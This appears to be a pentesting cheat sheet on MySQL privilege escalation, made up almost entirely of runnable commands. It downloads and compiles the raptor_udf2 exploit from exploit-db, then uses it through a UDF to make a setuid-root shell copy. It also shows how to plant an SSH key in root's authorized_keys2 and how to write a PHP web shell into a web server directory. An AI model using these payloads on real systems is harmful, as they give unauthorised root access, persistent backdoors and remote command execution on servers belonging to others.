---
title: "Mysql Privilege Escalation"
date: 2024-6-27
tags: ["mysql", "database", "RCE", "php", "UDF", "exploit", "pe"]
---

---
### Abuse #1: User Defined Function (UDF)

```bash
# Get the raptor_udf2.c
wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
```

```bash
# Compile the source script
gcc -g -c raptor_udf2.c
```

```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```bash
# Copy to target folder
cp raptor_udf2.so /dev/shm/raptor_udf2.so
```

```bash
# Connect to database as root
mysql -u root -p<PASSWORD> mysql
```

```bash
# UDF
create table foo(line blob);
```

```bash
insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
```

```bash
# Get plug-in directory
show variables like '%plugin%';
```

```bash
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
```

```bash
# Copy the plugin_dir value
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; 
```

```bash
create function do_system returns integer soname 'raptor_udf2.so';
```

```bash
# RCE
select do_system('cp /bin/bash /tmp/shell; chmod 4777 /tmp/shell');
```

### Abuse #2: Add ssh public key to root

```bash
# Connect to database as root
mysql -u root -p<PASSWORD> mysql
```

```bash
# Check privilege
select current_user();
```

```bash
show grants for root@localhost;
```

```bash
# If mysql file write is not able to append or overwrite authorized_keys
select "ssh-ed25519 AAAAC4NzaC1lZDI1NTE8AAAAINAhYR5O6zwRnV147lX8FuuMLs7o+K5/WfaoYVa8SmbR user@computer" into outfile "/root/.ssh/authorized_keys2";
```

### Abuse #3: Create php File from Database to RCE

```mysql
create table test(stuff text);
```

```bash
insert into test values('<?php system($_REQUEST["cmd"]); ?>');
```

```bash
select * from test into dumpfile 'C:\\xampp\\htdocs\\cmd.php';
```

<br>